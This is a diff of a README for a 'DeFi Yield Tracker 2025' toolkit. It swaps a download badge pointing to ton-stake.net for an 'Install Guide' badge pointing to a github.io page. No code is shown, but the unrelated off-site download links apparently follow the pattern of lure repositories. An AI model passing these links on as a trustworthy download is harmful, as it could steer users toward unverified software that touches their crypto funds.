@@ -3,7 +3,9 @@
 **DeFi Yield Tracker 2025** is a free toolkit for monitoring staking, liquidity pools, and yield farming rewards.  
 Includes dashboards and templates for DeFi protocols like Uniswap, Curve, Aave, and more.  
 
-[![Download Tracker](https://img.shields.io/badge/Download-DeFi_Tracker_2025-blueviolet)](https://ton-stake.net)
+<a href="https://defi-yield-tracker-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
